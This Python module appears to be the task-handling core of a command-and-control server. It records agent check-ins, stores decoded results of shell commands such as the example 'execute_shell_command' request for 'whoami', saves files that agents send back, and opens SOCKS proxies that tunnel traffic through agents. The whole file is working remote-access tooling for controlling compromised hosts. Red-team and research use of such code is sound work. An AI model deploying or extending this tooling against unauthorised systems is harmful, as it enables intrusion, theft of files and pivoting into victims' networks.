import os
import datetime
import threading
import random
import json

from collections import namedtuple
from connect.output import display
from connect.generate import string_identifier
from connect.convert import base64_to_string, base64_to_bytes
from connect.socks.manager import SocksManager
from .models import AgentModel, db, TaskModel


class ResultsHandler:

    def __init__(self, socks_manager):
        self.socks_manager = socks_manager
        self.task_types = {
            0: self.process_string_results,
            1: self.process_file_results,
            2: self.process_socks_results
        }

    def process_results(self, task, results):
        self.task_types[task.type](task, results)

    def process_string_results(self, task, results):
        results = base64_to_string(results)
        task.results = results
        self.commit(task)
        display(f'{task.agent.id} returned results for `{task.method}`:', 'SUCCESS')
        display(results, 'DEFAULT')

    def process_file_results(self, task, results):
        results = base64_to_bytes(results)
        file_name = f'{os.getcwd()}/instance/downloads/{string_identifier()}'
        with open(file_name, 'wb') as fd:
            fd.write(results)
        task.results = file_name
        self.commit(task)
        display(f'{task.agent.id} returned results for `{task.method}` wrote results to: `{file_name}`', 'SUCCESS')

    def process_socks_results(self, task, results):
        if task.method == 'socks':
            if task.agent.id in self.socks_manager.socks_servers:
                self.socks_manager.shutdown_socks_server(task.agent.id)
                return
            self.socks_manager.create_socks_server('127.0.0.1', int(task.misc[0]), task.agent.id)
            return
        results = json.loads(base64_to_string(results))
        if task.method == 'socks_connect':
            print('recieved socks_connect')
            threading.Thread(target=self.socks_manager.handle_socks_task_results, daemon=True, args=('socks_connect', results,)).start()
            if results['bind_addr']:
                downstream_task = TaskModel(agent=task.agent, method='socks_downstream', type=2,
                                            parameters=','.join([results['client_id']]))
                self.commit(downstream_task)
        elif task.method == 'socks_downstream':
            self.socks_manager.handle_socks_task_results('socks_downstream', results)

    @staticmethod
    def commit(model):
        db.session.add(model)
        db.session.commit()


class TaskManager:
    def __init__(self):
        self.incoming_tasks = {}
        self.socks_manager = SocksManager()
        self.results_handler = ResultsHandler(self.socks_manager)

    def parse_batch_response(self, batch_response: list) -> list:
        batch_request = []
        for task in batch_response:
            # ToDo: Verify JSON_RPC 2.0 compliance of `task`
            task_id = next((v for k, v in task.items() if k.lower() == 'id'), None)
            result = next((v for k, v in task.items() if k.lower() == 'result'), None)
            error = next((v for k, v in task.items() if k.lower() == 'error'), None)

            # process agent checkin
            agent = AgentModel.query.filter_by(check_in_task_id=task_id).first()
            if agent:
                batch_request = agent.get_tasks()
                agent.check_in = datetime.datetime.now()
                db.session.add(agent)
                db.session.commit()
                continue

            # process task results
            task = TaskModel.query.filter_by(id=task_id).first()
            if not task:
                display(f'Failed to find task with id {task_id}', 'ERROR')
                continue
            if result:
                task.completed = datetime.datetime.now()
                db.session.add(task)
                db.session.commit()
                self.results_handler.process_results(task, result)
                continue
            if error:
                task.completed = datetime.datetime.now()
                db.session.add(task)
                db.session.commit()
                display(error['message'], 'ERROR')
                continue
        return batch_request


"""
Example Batch Response:

# Task successful with results
[
    {
        'jsonrpc': '2.0',
        'result': 'c2t5bGVyCg==',
        'id': '0123456789'
    }
]

# Task successful with results and we need to set an agent property
[
    {
        'jsonrpc': '2.0',
        'result': ['c2t5bGVyCg==', 'c2t5bGVyCg=='],
        'id': '0123456789'
    }
]


# Task failed without results because the method is not supported.
[
    {
        'jsonrpc': '2.0',
        'error': {
            'code': -32601
            'message': 'This method is not supported'
        }
        'id': '0123456789'
    }
]

Example Batch Request:

[
    {
        'jsonrpc': '2.0',
        'method': 'execute_shell_command',
        'params': ['d2hvYW1pCg=='],
        'id': '0123456789'
    }
]
"""
